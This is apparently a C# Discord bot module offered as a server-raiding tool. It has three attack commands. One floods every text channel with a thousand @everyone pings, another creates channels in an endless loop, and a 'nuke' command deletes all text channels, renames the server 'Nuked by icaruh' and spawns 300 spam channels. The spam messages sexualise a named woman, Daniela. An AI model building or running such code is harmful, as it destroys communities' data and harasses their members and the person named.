using Discord.Commands;
using Discord.WebSocket;
using Discord;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Threading.Channels;
using System.Runtime.InteropServices;
namespace DiscordBot.Comandos
{
    public class Comandos : ModuleBase<SocketCommandContext>
    {
        private int canalCount = 1;
        private bool isCreatingChannels = false;
        private CancellationTokenSource _cts;

        [Command("daniela")]
        public async Task PingAsync()
        {
            var guild = Context.Guild as SocketGuild;
            if (guild == null) 
            {
                await ReplyAsync("sem acesso aos canais desse server");
                return;
            }
            var channels = guild.TextChannels;
            var message = "@everyone Daniela gostosa demais seloko https://www.youtube.com/watch?v=izSXarv7vbM";

            await Task.WhenAll(channels.Select (async channel =>
            {
                try
                {
                    for (int i = 0; i < 1000; i++)
                    {
                        await channel.SendMessageAsync(message);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Erro");
                }             
            }));
            
        }


        [Command("canal")]
        public async Task CriarCanal()
        {
            var guild = (SocketGuild)Context.Guild;
            var canalCount = 1;

            while (true)
            {
                string channelName = $"daniela-{canalCount}";
                canalCount++;

                try
                {
                    var channel = await guild.CreateTextChannelAsync(channelName);
                    await channel.SendMessageAsync("@everyone");

                    await Task.Delay(100);
                }
                catch (Exception ex)
                {
                    await ReplyAsync($"Erro ao criar canal: {ex.Message}");
                }

            }
            
        }

        [Command("nuke")]
        public async Task NukeAsync()
        {
            var guild = Context.Guild as SocketGuild;
            if (guild == null)
            {
                await ReplyAsync("sem acesso nessa porra");
                return;
            }

            var deleteTasks = guild.TextChannels.Select(channel => Task.Run(async () =>
            {
                try
                {
                    await channel.DeleteAsync();
                    Console.WriteLine($"{channel.Name} deletado");

                }
                catch (Exception ex)
                {
                    Console.WriteLine("erro deletando os canais");
                    
                }
            }));

            await Task.WhenAll(deleteTasks);
            try
            { 
               
                await guild.ModifyAsync(properties =>
                {
                    properties.Name = "Nuked by icaruh";
                    properties.Icon = null;
                });


                var createChannelTasks = new List<Task>();
                for (int i = 1; i <= 300; i++)
                {
                    createChannelTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            var channel = await guild.CreateTextChannelAsync($"daniela-{i}");
                            await channel.SendMessageAsync("@everyone daniela gostosa dms n tem jeito");
                            Console.WriteLine($"Daniela-{i} criado");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Erro ao criar canal daniela-{i}: {ex.Message}");
                        }
                    }));
                }

                await Task.WhenAll(createChannelTasks);
             

            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erro");
       
            }
        }

        [Command("ajuda")]
        public async Task ajudaAsync()
        {
            await ReplyAsync("   !nuke\n!daniela\n!canal");

        }


    }
}
